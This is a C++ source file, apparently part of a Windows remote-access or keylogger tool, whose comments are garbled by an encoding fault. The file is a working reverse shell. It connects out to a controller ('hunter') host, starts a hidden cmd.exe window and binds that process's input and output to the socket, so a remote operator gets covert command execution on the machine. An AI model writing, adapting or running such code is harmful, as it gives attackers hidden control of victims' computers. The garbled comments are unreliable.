#include "pch.h"
#include "Shell.h"

static Shell gShell; // ��ʼ����
static TcpSocket gSock; // �������ݵ��׽���
// ���������н���֮���õ���pi ����cmd����
static PROCESS_INFORMATION gPi = { 0 };

void Shell::startShell(std::string domain, int port) {
	// �½����ӵ�hunter�˵�socket����
	if (!gSock.connectTo(domain, port)) {
		gSock.dissconnect();
		OutputDebugStringA("Failed to connect hunter for keybd\r\n");
		return;
	}
	// �����ӽ���
	// ��ʱsocket����׼����
	// ������ͨcmd��socket���̺߳���
	HANDLE h = CreateThread(NULL, 0, Shell::threadProc, (LPVOID)NULL, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
		gSock.dissconnect();
		return;
	}
	OutputDebugStringA("start shell successfully\r\n");
}

// ����cmd�ӽ���
bool Shell::createCmd() {
	// ��Ϊ����ʹ�� ����Ҫ����׼��
	RtlZeroMemory(&gPi, sizeof(PROCESS_INFORMATION));
	// ����cmd����
	STARTUPINFOA si = { 0 };
	// ���ش���
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	// ��׼��������ʹ����������׽���
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)gSock.getSocket();
	// ƴ�����������е�����
	CHAR szCmdLine[256] = { 0 };
	GetSystemDirectoryA(szCmdLine, sizeof(szCmdLine));
	StringCchCatA(szCmdLine, _countof(szCmdLine), "\\cmd.exe");
	if (CreateProcessA(szCmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &gPi) == 0)
	{
		return false;
	}

	return true;
}

// �̺߳��� ����ͨ�ܵ���socket
DWORD Shell::threadProc(LPVOID args) {
	// ����cmd�ӽ��̲�������socket
	if (!createCmd()) {
		OutputDebugStringA("create cmd exe failed\r\n");
		return -1;
	}
	WaitForSingleObject(gPi.hProcess, INFINITE);
	CloseHandle(gPi.hThread);
	CloseHandle(gPi.hProcess);
	gSock.dissconnect();
	return 1;
}
